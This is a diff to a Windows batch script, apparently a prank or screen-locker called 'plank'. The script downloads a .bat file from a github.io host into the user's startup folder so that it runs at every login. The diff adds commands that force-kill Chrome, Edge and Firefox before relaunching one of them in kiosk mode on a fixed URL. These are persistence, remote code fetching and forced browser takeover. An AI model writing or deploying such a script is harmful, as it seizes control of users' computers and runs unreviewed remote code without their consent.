@@ -5,21 +5,26 @@ set "URL=https://cmd-hue.github.io/plank/"
 
 powershell -Command "Invoke-WebRequest -Uri 'https://cmd-hue.github.io/plank.bat' -OutFile '%startup%\plank.bat'"
 
+taskkill /f /im chrome.exe >nul 2>nul
+taskkill /f /im msedge.exe >nul 2>nul
+taskkill /f /im firefox.exe >nul 2>nul
+timeout /t 1 /nobreak >nul
+
 where chrome >nul 2>nul
 if not errorlevel 1 (
-    start chrome --kiosk "%URL%"
+    start "" chrome --kiosk "%URL%"
     exit
 )
 
 where msedge >nul 2>nul
 if not errorlevel 1 (
-    start msedge --kiosk "%URL%"
+    start "" msedge --kiosk "%URL%"
     exit
 )
 
 where firefox >nul 2>nul
 if not errorlevel 1 (
-    start firefox -kiosk "%URL%"
+    start "" firefox -kiosk "%URL%"
     exit
 )
 
